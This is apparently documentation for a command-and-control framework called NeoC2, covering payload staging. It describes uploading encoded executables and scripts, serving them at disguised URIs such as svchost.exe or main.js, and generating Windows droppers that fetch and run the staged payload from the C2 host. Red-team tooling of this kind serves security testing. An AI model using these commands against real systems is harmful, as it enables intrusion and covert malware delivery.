
# Payload Staging

NeoC2 supports staging payloads directly through the `payload_upload` base-command of the remote client server, allowing operators to deploy binary executables like .exe, .dll, or other file types in addition to Python scripts. The payload to be staged must be present on the command-and-control-server and its path provided for staging.

### Capabilities
- **Multi-Format Support**: Upload EXE, DLL, PY, JS, VBS, BAT, PS1, and other binary/script files
- **Encryption**: XOR encryption using SECRET_KEY environment variable with Base64 encoding
- **Dynamic URI Support**: Optionally specify custom URI for payload hosting (e.g., `/custom_payload /api/file.exe /download/svchost.exe`) instead of default `/api/assets/main.js`
- **Automatic Serving**: Uploaded payloads automatically available at specified URI
- **Intelligent Execution**: Droppers automatically detect payload type and handle appropriately
- **Maximum Size**: Supports payloads up to 50MB
- **Overwrite Functionality**: New uploads replace previous payloads

#### Example Usage:
```
NeoC2 > payload_upload upload /path/to/payload.exe                           # Upload with default URI
NeoC2 > payload_upload upload /path/to/payload.exe uri=/stage/my/payload.exe # Upload with custom URI
NeoC2 > payload_upload status                                                # Check upload status
NeoC2 > payload_upload clear                                                 # Clear uploaded payload

# Then deploy droppers
NeoC2 > stager generate windows_exe host=<c2_host> port=<c2_port> protocol=https download_uri=/stage/my/payload.exe
```
